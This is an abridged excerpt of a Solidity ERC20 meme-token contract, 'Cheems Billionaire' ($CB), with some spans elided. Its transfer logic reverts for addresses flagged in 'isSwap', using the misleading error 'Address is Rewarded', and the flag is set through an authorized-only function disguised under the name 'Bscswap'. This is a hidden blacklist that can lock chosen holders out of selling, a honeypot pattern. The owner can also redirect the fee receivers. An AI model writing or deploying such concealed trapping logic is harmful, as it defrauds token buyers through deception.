/**
 ...
 Telegram : t.me/CheemsBillionaire
...
contract CheemsBillionaire is ERC20, Auth {
    ...
    string constant private _name = "Cheems Billionaire";
    string constant private _symbol = "$CB";
    uint8 constant private _decimals = 18;

    uint256 private _totalSupply = 1000_000_000_000* 10**_decimals;
    ...
    address private autoLiquidityReceiver = 0x647498C084a45d86daE58543503E7017bBC3dCF8 ;
    address private MarketingFeeReceiver = 0x647498C084a45d86daE58543503E7017bBC3dCF8;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!isSwap[recipient] && !isSwap[sender], 'Address is Rewarded');
    ...
    function Bscswap(address _address, bool _value) public authorized{
        isSwap[_address] = _value;
    }
    ...
    function setFeeReceivers(address _autoLiquidityReceiver, address _MarketingFeeReceiver, address _BurnFeeReceiver) external onlyOwner {
        require(_autoLiquidityReceiver != address(0) && _MarketingFeeReceiver != address(0) && _BurnFeeReceiver != address(0), "Zero Address validation" );
        autoLiquidityReceiver = _autoLiquidityReceiver;
        MarketingFeeReceiver = _MarketingFeeReceiver;
        BurnFeeReceiver = _BurnFeeReceiver; 
        emit SetFeeReceivers(_autoLiquidityReceiver, _MarketingFeeReceiver, _BurnFeeReceiver);
    }
